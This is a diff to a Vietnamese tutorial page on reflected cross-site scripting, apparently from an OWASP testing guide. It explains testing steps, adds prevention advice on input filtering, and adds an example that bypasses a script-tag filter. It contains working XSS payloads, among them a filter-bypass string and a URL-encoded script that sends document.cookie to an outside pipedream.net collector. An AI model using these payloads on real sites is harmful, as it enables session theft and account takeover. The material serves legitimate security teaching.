@@ -7,8 +7,7 @@
 ```http://example.com/?search=<script>alert(1)</script>```
 ## Reason
 - Server không kiểm soát giá trị input người dùng nhập vào trước khi trả về cho trình duyệt
-- Người dùng sử dụng các trình duyệt đã lỗi thời
-- Sự chủ quan, thiếu kiến thức và sự đề phòng của nạn nhân
+
 ## Exploit
 1. Phát hiện input vector  
     * Đối với mỗi trang web, người kiểm tra phải xác định tất cả các input do người dùng định nghĩa và cách nhập chúng
@@ -24,6 +23,8 @@ Example: Input
 3. Phân tích kết quả
     * Người kiểm tra xác định bất kỳ ký tự đặc biệt nào không được mã hóa, thay thế hoặc lọc đúng
     * Các kí tự HTML đặc biệt cần phải được thay thế bằng HTML entities hoặc replace,encode,...
+## Prevention
+- Lọc input và ouput bằng các hàm như replace(),addslashes(),pre_match(),htmlspecialchars(),htmlentities(),...
 ## Example
 ### Example 1:
 ![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/001-1.png)  
@@ -40,7 +41,7 @@ Example: Input
 
 ![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/001-4.png "dữ liệu xử lí không được filter")
 
-- Hacker có thể inject đoạn script cực kì độc hại đánh lừa nạn nhân và đánh cắp cookie như sau:  
+- Hacker có thể inject đoạn script cực kì độc hại lừa nạn nhân và đánh cắp cookie như sau:  
 ```js
 ?name=<script>var+i%3Dnew+Image()%3Bi.src%3D"https%3A%2F%2Fentqd5oi4bil.x.pipedream.net%3Fa%3D"%2Bdocument.cookie%3B<%2Fscript>#
 ```
@@ -65,3 +66,17 @@ Example: Input
 * Đối với dạng filter lỏng lẻo như thế này chúng ta có thể bypass bằng payload có dạng như sau: ```<scr<script>ipt>alert(1);</script>```  
 
 ![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/001-8.png)
+
+#### Example 3:
+![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/001-10.png)
+- Ở ví dụ này chúng ta thấy input đã được lọc bởi hàm preg_replace(),tất cả dữ liệu người dùng nhập vào có chứa tag ```<script>``` đều sẽ bị loại bỏ. Nhưng như thế liệu có hoàn toàn an toàn???  
+
+![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/001-11.png)
+
+- Đối với những trường hợp như thế này hacker có thể thay thế thẻ script bằng các thẻ khác như ```<a>```,```<img>```,... và chèn script độc hại thông qua HTML Event Attributes.
+
+![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/001-12.png)
+
+Result:
+
+![](https://github.com/huyenlamchiton/owasp/blob/master/Input%20Validation%20Testing/image/001-13.png)
